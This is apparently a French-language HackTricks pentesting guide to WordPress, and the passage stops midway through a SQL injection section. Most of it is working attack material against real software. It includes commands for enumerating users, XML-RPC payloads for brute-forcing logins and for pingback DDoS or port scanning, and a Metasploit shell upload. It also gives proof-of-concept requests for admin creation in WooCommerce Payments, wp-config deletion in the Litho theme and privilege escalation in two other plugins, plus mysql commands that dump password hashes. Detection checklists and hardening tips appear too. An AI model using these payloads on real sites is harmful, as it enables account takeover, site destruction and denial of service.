# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Informations de base

- **Les fichiers t√©l√©vers√©s** vont dans : `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Les fichiers de th√®mes se trouvent dans /wp-content/themes/,** donc si vous modifiez un php du th√®me pour obtenir RCE vous utiliserez probablement ce chemin. Par exemple : en utilisant **th√®me twentytwelve** vous pouvez **acc√©der** au fichier **404.php** dans : [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Une autre URL utile pourrait √™tre :** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Dans **wp-config.php** vous pouvez trouver le mot de passe root de la base de donn√©es.
- Chemins de connexion par d√©faut √† v√©rifier : _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Fichiers principaux de WordPress**

- `index.php`
- `license.txt` contient des informations utiles telles que la version de WordPress install√©e.
- `wp-activate.php` est utilis√© pour le processus d'activation par email lors de la cr√©ation d'un nouveau site WordPress.
- Dossiers de connexion (peuvent √™tre renomm√©s pour les cacher) :
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` est un fichier qui repr√©sente une fonctionnalit√© de WordPress permettant de transmettre des donn√©es avec HTTP comme m√©canisme de transport et XML comme m√©canisme d'encodage. Ce type de communication a √©t√© remplac√© par le WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Le dossier `wp-content` est le r√©pertoire principal o√π sont stock√©s les plugins et th√®mes.
- `wp-content/uploads/` est le r√©pertoire o√π sont stock√©s tous les fichiers t√©l√©vers√©s sur la plateforme.
- `wp-includes/` est le r√©pertoire o√π sont stock√©s les fichiers core, tels que certificats, polices, fichiers JavaScript et widgets.
- `wp-sitemap.xml` Dans les versions de WordPress 5.5 et sup√©rieures, WordPress g√©n√®re un fichier sitemap XML contenant tous les posts publics et les types de post et taxonomies consultables publiquement.

**Post exploitation**

- Le fichier `wp-config.php` contient les informations requises par WordPress pour se connecter √† la base de donn√©es telles que le nom de la base, l'h√¥te de la base, le nom d'utilisateur et le mot de passe, les cl√©s d'authentification et salts, et le pr√©fixe des tables de la base. Ce fichier de configuration peut aussi √™tre utilis√© pour activer le mode DEBUG, ce qui peut √™tre utile pour le troubleshooting.

### Permissions des utilisateurs

- **Administrateur**
- **√âditeur** : Publie et g√®re ses propres posts et ceux des autres
- **Auteur** : Publie et g√®re ses propres posts
- **Contributeur** : R√©dige et g√®re ses posts mais ne peut pas les publier
- **Abonn√©** : Parcourt les posts et √©dite son profil

## **√ânum√©ration passive**

### **Obtenir la version de WordPress**

V√©rifiez si vous pouvez trouver les fichiers `/license.txt` ou `/readme.html`

Dans le **code source** de la page (exemple de [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)) :

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link files

![](<../../images/image (533).png>)

- JavaScript files

![](<../../images/image (524).png>)

### Obtenir des plugins
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### R√©cup√©rer les th√®mes
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Extraire les versions en g√©n√©ral
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## √ânum√©ration active

### Plugins et th√®mes

Vous ne pourrez probablement pas trouver tous les plugins et th√®mes possibles. Pour les d√©couvrir tous, vous devrez **Brute Force activement une liste de plugins et th√®mes** (esp√©rons pour nous qu'il existe des outils automatis√©s qui contiennent ces listes).

### Utilisateurs

- **ID Brute:** Vous obtenez des utilisateurs valides d'un site WordPress en Brute Forcing les IDs des utilisateurs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Si les r√©ponses sont **200** ou **30X**, cela signifie que l'id est **valide**. Si la r√©ponse est **400**, alors l'id est **invalide**.

- **wp-json:** Vous pouvez aussi essayer d'obtenir des informations sur les utilisateurs en interrogeant :
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Un autre endpoint `/wp-json/` qui peut r√©v√©ler certaines informations sur les utilisateurs est :
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Notez que cet endpoint n'expose que les utilisateurs qui ont publi√© un article. **Seules les informations concernant les utilisateurs ayant cette fonctionnalit√© activ√©e seront fournies**.

Notez √©galement que **/wp-json/wp/v2/pages** pourrait leak des adresses IP.

- **Login username enumeration**: Lors de la connexion via **`/wp-login.php`** le **message** est **diff√©rent** selon que le **nom d'utilisateur existe ou non**.

### XML-RPC

Si `xml-rpc.php` est actif vous pouvez effectuer un credentials brute-force ou l'utiliser pour lancer des attaques DoS vers d'autres ressources. (Vous pouvez automatiser ce processus [en utilisant ceci](https://github.com/relarizky/wpxploit) par exemple).

Pour v√©rifier s'il est actif essayez d'acc√©der √† _**/xmlrpc.php**_ et envoyez cette requ√™te :

**V√©rifier**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** ou **`metaWeblog.getUsersBlogs`** sont quelques-unes des m√©thodes qui peuvent √™tre utilis√©es pour brute-force des credentials. Si vous trouvez l'une d'elles, vous pouvez envoyer quelque chose comme :
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
_"Incorrect username or password"_ dans une r√©ponse avec code 200 doit appara√Ætre si les credentials ne sont pas valides.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

En utilisant les bons credentials, vous pouvez upload un fichier. Dans la r√©ponse, le path appara√Ætra ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Also there is a **faster way** to brute-force credentials using **`system.multicall`** as you can try several credentials on the same request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

This method is meant for programs and not for humans, and old, therefore it doesn't support 2FA. So, if you have valid creds but the main entrance is protected by 2FA, **you might be able to abuse xmlrpc.php to login with those creds bypassing 2FA**. Note that you won't be able to perform all the actions you can do through the console, but you might still be able to get to RCE as Ippsec explains it in [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS or port scanning**

If you can find the method _**pingback.ping**_ inside the list you can make the Wordpress send an arbitrary request to any host/port.\
This can be used to ask **thousands** of Wordpress **sites** to **access** one **location** (so a **DDoS** is caused in that location) or you can use it to make **Wordpress** lo **scan** some internal **network** (you can indicate any port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Si vous obtenez **faultCode** avec une valeur **sup√©rieure** √† **0** (17), cela signifie que le port est ouvert.

Regardez l'utilisation de **`system.multicall`** dans la section pr√©c√©dente pour apprendre comment abuser de cette m√©thode afin de provoquer un DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ce fichier existe g√©n√©ralement √† la racine du site Wordpress : **`/wp-cron.php`**\
Quand ce fichier est **acc√©d√©**, une requ√™te MySQL **lourde** est ex√©cut√©e, il pourrait donc √™tre utilis√© par des **attaquants** pour **provoquer** un **DoS**.\
De plus, par d√©faut, le `wp-cron.php` est appel√© √† chaque chargement de page (lorsqu'un client demande n'importe quelle page Wordpress), ce qui peut poser des probl√®mes (DoS) sur les sites √† fort trafic.

Il est recommand√© de d√©sactiver Wp-Cron et de cr√©er un vrai cronjob sur l'h√¥te qui ex√©cute les actions n√©cessaires √† intervalle r√©gulier (sans causer de probl√®mes).

### /wp-json/oembed/1.0/proxy - SSRF

Essayez d'acc√©der √† _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ et le site Worpress peut effectuer une requ√™te vers vous.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Cet outil v√©rifie si le **methodName: pingback.ping** existe pour le path **/wp-json/oembed/1.0/proxy** et si c'est le cas, il tente de les exploiter.

## Outils automatiques
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Obtenir l'acc√®s en modifiant un bit

Plus qu'une attaque r√©elle, c'est une curiosit√©. Dans le CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) vous pouviez inverser 1 bit dans n'importe quel fichier wordpress. Ainsi, vous pouviez inverser le bit √† la position `5389` du fichier `/var/www/html/wp-includes/user.php` pour NOP l'op√©ration NOT (`!`).
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modification d'un fichier php du th√®me utilis√© (identifiants admin n√©cessaires)**

Appearance ‚Üí Theme Editor ‚Üí 404 Template (√† droite)

Remplacez le contenu par un php shell :

![](<../../images/image (384).png>)

Cherchez sur Internet comment acc√©der √† cette page mise √† jour. Dans ce cas, vous devez acc√©der ici : [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

Vous pouvez utiliser :
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

Il peut √™tre possible d'uploader des fichiers .php en tant que plugin.\
Cr√©ez votre backdoor php en utilisant par exemple :

![](<../../images/image (183).png>)

Puis ajoutez un nouveau plugin :

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Cliquez sur Procced:

![](<../../images/image (70).png>)

Probablement cela n'affichera rien apparemment, mais si vous allez dans Media, vous verrez votre shell upload√© :

![](<../../images/image (462).png>)

Acc√©dez-y et vous verrez l'URL pour ex√©cuter le reverse shell :

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Cette m√©thode consiste en l'installation d'un plugin malveillant connu pour √™tre vuln√©rable et pouvant √™tre exploit√© pour obtenir un web shell. Ce processus est effectu√© via le WordPress dashboard comme suit :

1. **Plugin Acquisition**: Le plugin est obtenu depuis une source comme Exploit DB comme [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Acc√©dez au WordPress dashboard, puis allez dans `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Une fois le plugin install√© avec succ√®s, il doit √™tre activ√© via le dashboard.
4. **Exploitation**:
- Avec le plugin "reflex-gallery" install√© et activ√©, il peut √™tre exploit√© car il est connu vuln√©rable.
- Le framework Metasploit fournit un exploit pour cette vuln√©rabilit√©. En chargeant le module appropri√© et en ex√©cutant des commandes sp√©cifiques, une session meterpreter peut √™tre √©tablie, accordant un acc√®s non autoris√© au site.
- Il est √† noter que ceci n'est qu'une des nombreuses m√©thodes pour exploiter un site WordPress.

Le contenu inclut des aides visuelles d√©crivant les √©tapes dans le WordPress dashboard pour l'installation et l'activation du plugin. Cependant, il est important de noter que l'exploitation de vuln√©rabilit√©s de cette mani√®re est ill√©gale et contraire √† l'√©thique sans une autorisation appropri√©e. Ces informations doivent √™tre utilis√©es de mani√®re responsable et uniquement dans un contexte l√©gal, comme le penetration testing avec permission explicite.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## De XSS √† RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ est un script con√ßu pour escalader une vuln√©rabilit√© **Cross-Site Scripting (XSS)** vers une **Remote Code Execution (RCE)** ou d'autres vuln√©rabilit√©s critiques dans WordPress. Pour plus d'infos, consultez [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). Il fournit **support pour Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Cr√©e un utilisateur dans WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Upload your custom plugin (backdoor) to WordPress.
- _**(RCE) Built-In Plugin Edit:**_ √âdite un Built-In Plugin dans WordPress.
- _**(RCE) Built-In Theme Edit:**_ √âdite un Built-In Theme dans WordPress.
- _**(Custom) Custom Exploits:**_ Exploits personnalis√©s pour des plugins/themes WordPress tiers.

## Post Exploitation

Extraire les noms d'utilisateur et les mots de passe:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Changer le mot de passe administrateur :
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Pentest des plugins Wordpress

### Surface d'attaque

Savoir comment un plugin Wordpress peut exposer des fonctionnalit√©s est essentiel pour trouver des vuln√©rabilit√©s dans son fonctionnement. Vous pouvez voir comment un plugin peut exposer des fonctionnalit√©s dans les points suivants et des exemples de plugins vuln√©rables dans [**cet article de blog**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

L'une des fa√ßons dont un plugin peut exposer des fonctions aux utilisateurs est via des gestionnaires AJAX. Ceux-ci peuvent contenir des bugs de logique, d'autorisation ou d'authentification. De plus, il est assez fr√©quent que ces fonctions basent √† la fois l'authentification et l'autorisation sur l'existence d'un nonce Wordpress que **tout utilisateur authentifi√© dans l'instance Wordpress peut avoir** (ind√©pendamment de son r√¥le).

Voici les fonctions qui peuvent √™tre utilis√©es pour exposer une fonction dans un plugin :
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**L'utilisation de `nopriv` rend l'endpoint accessible par n'importe quel utilisateur (m√™me les utilisateurs non authentifi√©s).**

> [!CAUTION]
> De plus, si la fonction se contente de v√©rifier l'autorisation de l'utilisateur avec la fonction `wp_verify_nonce`, cette fonction v√©rifie seulement que l'utilisateur est connect√© ; elle ne v√©rifie g√©n√©ralement pas le r√¥le de l'utilisateur. Ainsi, des utilisateurs √† faibles privil√®ges pourraient avoir acc√®s √† des actions √† privil√®ges √©lev√©s.

- **REST API**

It's also possible to expose functions from wordpress registering a rest AP using the `register_rest_route` function:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` est une fonction de rappel qui v√©rifie si un utilisateur donn√© est autoris√© √† appeler la m√©thode API.

**Si la fonction int√©gr√©e `__return_true` est utilis√©e, elle contourne simplement la v√©rification des permissions utilisateur.**

- **Acc√®s direct au fichier PHP**

Bien s√ªr, Wordpress utilise PHP et les fichiers des plugins sont directement accessibles depuis le web. Donc, si un plugin expose une fonctionnalit√© vuln√©rable qui est d√©clench√©e simplement en acc√©dant au fichier, elle pourra √™tre exploit√©e par n'importe quel utilisateur.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

Some plugins implement ‚Äútrusted header‚Äù shortcuts for internal integrations or reverse proxies and then use that header to set the current user context for REST requests. If the header is not cryptographically bound to the request by an upstream component, an attacker can spoof it and hit privileged REST routes as an administrator.

- Impact : √©l√©vation de privil√®ges non authentifi√©e vers admin en cr√©ant un nouvel administrateur via la route REST core users.
- En-t√™te d'exemple : `X-Wcpay-Platform-Checkout-User: 1` (force l'ID utilisateur 1, typiquement le premier compte administrateur).
- Route exploit√©e : `POST /wp-json/wp/v2/users` avec un tableau de r√¥le avec privil√®ges √©lev√©s.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Pourquoi √ßa fonctionne

- Le plugin mappe un header contr√¥l√© par le client √† l'√©tat d'authentification et ignore les v√©rifications de capabilities.
- WordPress core attend la capability `create_users` pour cette route ; le contournement du plugin l'√©vite en d√©finissant directement le contexte de l'utilisateur courant √† partir du header.

Indicateurs de succ√®s attendus

- HTTP 201 avec un corps JSON d√©crivant l'utilisateur cr√©√©.
- Un nouvel utilisateur admin visible dans `wp-admin/users.php`.

Checklist de d√©tection

- Grep pour `getallheaders()`, `$_SERVER['HTTP_...']`, ou des vendor SDKs qui lisent des headers personnalis√©s pour d√©finir le contexte utilisateur (par ex. `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Examiner les enregistrements REST pour des callbacks privil√©gi√©s qui n'ont pas de v√©rifications `permission_callback` robustes et qui s'appuient √† la place sur les headers de la requ√™te.
- Rechercher les usages des fonctions core de gestion d'utilisateurs (`wp_insert_user`, `wp_create_user`) √† l'int√©rieur des handlers REST qui ne sont prot√©g√©s que par des valeurs de header.

### Suppression arbitraire de fichiers sans authentification via wp_ajax_nopriv (Litho Theme <= 3.0)

Les th√®mes et plugins WordPress exposent fr√©quemment des handlers AJAX via les hooks `wp_ajax_` et `wp_ajax_nopriv_`. Lorsque la variante **_nopriv_** est utilis√©e **le callback devient accessible aux visiteurs non authentifi√©s**, donc toute action sensible doit en plus impl√©menter :

1. Une **v√©rification de capability** (par ex. `current_user_can()` ou au minimum `is_user_logged_in()`), et
2. Un **CSRF nonce** valid√© avec `check_ajax_referer()` / `wp_verify_nonce()`, et
3. Une **sanitisation / validation stricte des entr√©es**.

Le th√®me multipurpose Litho (< 3.1) a omis ces 3 contr√¥les dans la fonctionnalit√© *Remove Font Family* et a fini par livrer le code suivant (simplifi√©) :
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Probl√®mes introduits par cet extrait :

* **Acc√®s non authentifi√©** ‚Äì le hook `wp_ajax_nopriv_` est enregistr√©.
* **No nonce / capability check** ‚Äì n'importe quel visiteur peut appeler l'endpoint.
* **No path sanitisation** ‚Äì la cha√Æne contr√¥l√©e par l'utilisateur `fontfamily` est concat√©n√©e √† un chemin de fichier sans filtrage, permettant le classique parcours `../../`.

#### Exploitation

Un attaquant peut supprimer n'importe quel fichier ou r√©pertoire **sous le r√©pertoire de base uploads** (normalement `<wp-root>/wp-content/uploads/`) en envoyant une seule requ√™te HTTP POST :
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Parce que `wp-config.php` se trouve en dehors de *uploads*, quatre s√©quences `../` suffisent sur une installation par d√©faut. Supprimer `wp-config.php` force WordPress √† lancer l'*installation wizard* lors de la visite suivante, permettant une prise de contr√¥le compl√®te du site (l'attaquant fournit simplement une nouvelle configuration DB et cr√©e un utilisateur admin).

D'autres cibles impactantes incluent les fichiers `.php` des plugins/themes (pour casser des plugins de s√©curit√©) ou les r√®gles `.htaccess`.

#### Detection checklist

* Any `add_action( 'wp_ajax_nopriv_...')` callback that calls filesystem helpers (`copy()`, `unlink()`, `$wp_filesystem->delete()`, etc.).
* Concatenation of unsanitised user input into paths (look for `$_POST`, `$_GET`, `$_REQUEST`).
* Absence of `check_ajax_referer()` and `current_user_can()`/`is_user_logged_in()`.

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

De nombreux plugins impl√©mentent une fonctionnalit√© "view as role" ou de changement temporaire de r√¥le en sauvegardant le(s) r√¥le(s) originel(s) dans les user meta afin de pouvoir les restaurer plus tard. Si le chemin de restauration repose uniquement sur des param√®tres de requ√™te (par ex., `$_REQUEST['reset-for']`) et sur une liste maintenue par le plugin sans v√©rifier les capabilities ni un nonce valide, cela devient une √©l√©vation verticale de privil√®ges.

Un exemple r√©el a √©t√© trouv√© dans le plugin Admin and Site Enhancements (ASE) (‚â§ 7.6.2.1). La branche de reset restaurait les r√¥les en fonction de `reset-for=<username>` si le nom d'utilisateur apparaissait dans un tableau interne `$options['viewing_admin_as_role_are']`, mais n'effectuait ni un contr√¥le `current_user_can()` ni une v√©rification de nonce avant de supprimer les r√¥les actuels et de r√©ajouter les r√¥les sauvegard√©s depuis les user meta `_asenha_view_admin_as_original_roles` :
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Pourquoi c‚Äôest exploitable

- Fait confiance √† `$_REQUEST['reset-for']` et √† une option du plugin sans autorisation c√¥t√© serveur.
- Si un utilisateur avait auparavant des privil√®ges plus √©lev√©s sauvegard√©s dans `_asenha_view_admin_as_original_roles` et a √©t√© r√©trograd√©, il peut les restaurer en appelant le chemin de r√©initialisation.
- Dans certains d√©ploiements, n'importe quel utilisateur authentifi√© pouvait d√©clencher une r√©initialisation pour un autre nom d'utilisateur encore pr√©sent dans `viewing_admin_as_role_are` (contr√¥le d'acc√®s d√©faillant).

Exploitation (exemple)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
Sur les builds vuln√©rables, cela supprime les r√¥les actuels et r√©-ajoute les r√¥les originaux sauvegard√©s (p.ex., `administrator`), escaladant effectivement les privil√®ges.

Detection checklist

- Recherchez des fonctionnalit√©s de changement de r√¥le qui conservent les original roles dans user meta (p.ex., `_asenha_view_admin_as_original_roles`).
- Identifiez les chemins de r√©initialisation/restauration qui :
- Lire les noms d'utilisateur depuis `$_REQUEST` / `$_GET` / `$_POST`.
- Modifier les r√¥les via `add_role()` / `remove_role()` sans `current_user_can()` et `wp_verify_nonce()` / `check_admin_referer()`.
- Autoriser en se basant sur un tableau d'options du plugin (p.ex., `viewing_admin_as_role_are`) au lieu des capacit√©s de l'acteur.

---

### Escalade de privil√®ges non authentifi√©e via cookie‚Äëtrusted user switching sur le hook public init (Service Finder ‚Äúsf-booking‚Äù)

Certains plugins branchent des helpers de changement d'utilisateur sur le hook public `init` et d√©rivent l'identit√© d'un cookie contr√¥l√© par le client. Si le code appelle `wp_set_auth_cookie()` sans v√©rifier l'authentification, les capacit√©s et un nonce valide, tout visiteur non authentifi√© peut forcer la connexion en tant qu'ID utilisateur arbitraire.

Sch√©ma vuln√©rable typique (simplifi√© depuis Service Finder Bookings ‚â§ 6.1) :
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // üî• sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Pourquoi c‚Äôest exploitable

- Le hook public `init` rend le handler accessible aux utilisateurs non authentifi√©s (pas de v√©rification `is_user_logged_in()`).
- L'identit√© est d√©riv√©e d'un cookie modifiable c√¥t√© client (`original_user_id`).
- Un appel direct √† `wp_set_auth_cookie($uid)` connecte le requ√©rant en tant que cet utilisateur sans aucune v√©rification de capability/nonce.

Exploitation (non authentifi√©e)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Consid√©rations WAF pour WordPress/plugin CVEs

Les WAFs g√©n√©riques en p√©riph√©rie/serveur sont configur√©s pour des motifs larges (SQLi, XSS, LFI). Beaucoup de failles WordPress/plugin √† fort impact sont des bugs de logique d'application/auth sp√©cifiques qui ressemblent √† du trafic b√©nin √† moins que le moteur ne comprenne les routes WordPress et la s√©mantique des plugins.

Notes offensives

- Ciblez les endpoints sp√©cifiques aux plugins avec des payloads propres: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Testez d'abord les chemins non-authentifi√©s (AJAX `nopriv`, REST avec permissive `permission_callback`, shortcodes publics). Les payloads par d√©faut r√©ussissent souvent sans obfuscation.
- Cas typiques √† fort impact : √©l√©vation de privil√®ges (broken access control), arbitrary file upload/download, LFI, open redirect.

Notes d√©fensives

- Ne comptez pas sur des signatures WAF g√©n√©riques pour prot√©ger les CVEs des plugins. Impl√©mentez des correctifs virtuels sp√©cifiques aux vuln√©rabilit√©s au niveau applicatif ou mettez √† jour rapidement.
- Privil√©giez des contr√¥les en mode s√©curit√© positive dans le code (capabilities, nonces, validation stricte des entr√©es) plut√¥t que des filtres regex n√©gatifs.

## Protection WordPress

### Mises √† jour r√©guli√®res

Assurez-vous que WordPress, les plugins et les th√®mes sont √† jour. V√©rifiez √©galement que la mise √† jour automatique est activ√©e dans wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
De plus, **n'installez que des plugins et th√®mes WordPress fiables**.

### Plugins de s√©curit√©

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Autres recommandations**

- Supprimez l'utilisateur **admin** par d√©faut
- Utilisez des **mots de passe robustes** et **2FA**
- P√©riodiquement **r√©visez** les **autorisations** des utilisateurs
- **Limitez les tentatives de connexion** pour pr√©venir les attaques Brute Force
- Renommez le fichier `wp-admin.php` et n'autorisez l'acc√®s qu'en interne ou depuis certaines adresses IP.

### SQL Injection non authentifi√©e due √† une validation insuffisante (WP Job Portal <= 2.3.2)

Le plugin de recrutement WP Job Portal a expos√© une t√¢che **savecategory** qui ex√©cute finalement le code vuln√©rable suivant dans `modules/category/model.php::validateFormData()` :
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Probl√®mes introduits par cet extrait :

